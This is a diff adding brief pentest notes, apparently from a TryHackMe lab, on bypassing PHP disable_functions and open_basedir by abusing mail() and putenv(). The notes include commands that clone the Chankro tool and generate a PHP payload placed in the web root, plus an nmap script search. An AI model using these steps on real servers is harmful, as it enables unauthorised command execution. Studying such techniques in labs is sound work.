@@ -1,0 +1,21 @@
+Bypass disable function
+ possibility of uploading a file without being checked by a security system
+
+(scripts such as .php, .aspx and more
+disabling dangerous functions that could execute operating system commands or start processes
+
+Functions such as system() or shell_exec() are often disabled through PHP directives defined in the php.ini configuration file
+
+
+ easiest techniques to implement and not very widespread is to abuse the mail() and putenv() functionalities
+
+Download chankro tool to evade disable_funtion and open_basedir
+
+git clone https://github.com/TarlogicSecurity/Chankro.git
+cd Chankro
+python2 chankro.py --help
+python chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html
+
+
+Nmap scan for scripts
+grep "ftp" /usr/share/nmap/scripts/script.db
